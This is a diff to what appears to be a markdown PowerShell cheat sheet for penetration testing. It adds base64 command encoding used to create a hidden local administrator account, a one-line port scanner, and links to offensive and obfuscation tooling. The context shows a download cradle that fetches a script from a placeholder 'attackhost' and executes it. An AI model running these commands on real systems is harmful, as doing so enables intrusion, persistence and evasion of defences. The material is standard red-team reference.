@@ -23,6 +23,9 @@
 * Specify User-Agent with Net.WebClient
 * -ExecutionPolicy bypass
 * -Window hidden
+* [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)
+* [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+
 
 # Download File
 ### Download File To Disk
@@ -102,6 +105,28 @@ PS C:\> iex $downloader.responseText
 PS C:\> $d=New-Object -ComObject WinHttp.WinHttp.5.1; $d.open("GET", "https://attackhost/script.ps1", false); $d.send(); iex $d.responseText
 ```
 
+# Encoding
+```powershell
+PS C:\> $cmd = 'net user myadmin "password" /add; net localgroup Administrators myadmin /add'
+PS C:\> $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+PS C:\> $enc = [Convert]::ToBase64String($bytes)
+
+PS C:\> Write-Host $enc # Outputs encoded command
+
+C:\> powershell -encodedcommand [Output from previous command]
+```
+
+
+# Module Commands
+##### Get Module Path
+```powershell
+PS C:\> $env.PSModulePath
+```
+##### Import Module
+```powershell
+PS C:\> Import-Module [Module Name]
+```
+
 # Processes
 ##### Get list of processes running, sorted by name.
 ```powershell
@@ -118,30 +143,36 @@ whoami /priv
 powershell Get-Service
 ```
 
+# Discovery
+##### Port Scanner
+```powershell
+PS C:\> $ports=(80, 443); $ip="10.0.0.1"; foreach ($port in $ports) {try {$socket=New-Object System.Net.Sockets.TcpClient($ip, $port);} catch{}; if ($socket -eq $null) {echo $ip":"$port" - Close";}else{echo $ip":"$port" - Open"; $socket=$null;}}
+```
+##### [Get-HttpStatus](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
+##### [Posh-SecMod](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
+
 # [From Meterpreter](../../../Metasploit/README.MD#PowerShell)
 
 # Tools
+##### [Empire](https://github.com/EmpireProject/Empire)
+##### [Get-HttpStatus](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
 ##### [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)
+##### [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+##### [Invoke-Portscan](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
+##### [Nishang](https://github.com/samratashok/nishang)
+##### [Posh-SecMod](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
+##### [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
+##### [psgetsystem](https://github.com/decoder-it/psgetsystem)
+##### [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
 
 # References
 ##### [Generates obfuscated PowerShell snippets](https://amsi.fail/)
-
 ##### [Approved Verbs for PowerShell Commands](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.2&viewFallbackFrom=powershell-7.1)
-
 ##### [Everything you wanted to know about the if statement](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-if?view=powershell-7.2&viewFallbackFrom=powershell-7.1)
-
 ##### [How to run a PowerShell script from the command prompt?](https://www.tutorialspoint.com/how-to-run-a-powershell-script-from-the-command-prompt)
-
 ##### [Learn X in Y minutes](https://learnxinyminutes.com/docs/powershell/)
-
 ##### [Powershell](https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powershell.html)
-
 ##### [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
-
 ##### [PowerShellMafia](https://github.com/PowerShellMafia)
-
-##### [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
-
 ##### [Use Windows PowerShell to search for files](https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/)
-
 ##### [Where-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2&viewFallbackFrom=powershell-7.1)
